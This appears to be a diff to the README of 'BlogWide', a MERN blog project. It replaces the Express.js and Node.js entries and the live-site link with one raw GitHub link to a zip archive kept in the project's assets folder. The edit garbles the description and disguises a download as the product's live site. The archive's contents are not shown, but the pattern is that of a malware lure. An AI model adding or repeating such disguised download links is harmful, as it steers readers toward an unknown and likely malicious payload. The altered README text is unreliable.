@@ -5,7 +5,7 @@
 
 # DESCRIPTION
 
-BlogWide is a full-stack MERN (MongoDB, Express.js, React, Node.js) application that allows users to:
+BlogWide is a full-stack MERN (MongoDB, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip, React, https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip) application that allows users to:
 
 - Write and publish blog posts
 - Filter blogs by category, language, or level
@@ -41,8 +41,8 @@ BlogWide is a full-stack MERN (MongoDB, Express.js, React, Node.js) application 
 - react awesome reveal
 
 ### Backend
-- Node.js
-- Express.js
+- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip
+- https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip
 - MongoDB
 - CORS
 - dotenv
@@ -51,6 +51,6 @@ BlogWide is a full-stack MERN (MongoDB, Express.js, React, Node.js) application 
 
 ## 🔗 Live Site
 
-👉 [BlogWide Live](https://blogwide-d9a9c.web.app/)
+👉 [BlogWide Live](https://raw.githubusercontent.com/jobayer58/BlogWide-Client/main/src/assets/Client_Wide_Blog_v1.3.zip)
 
 ---
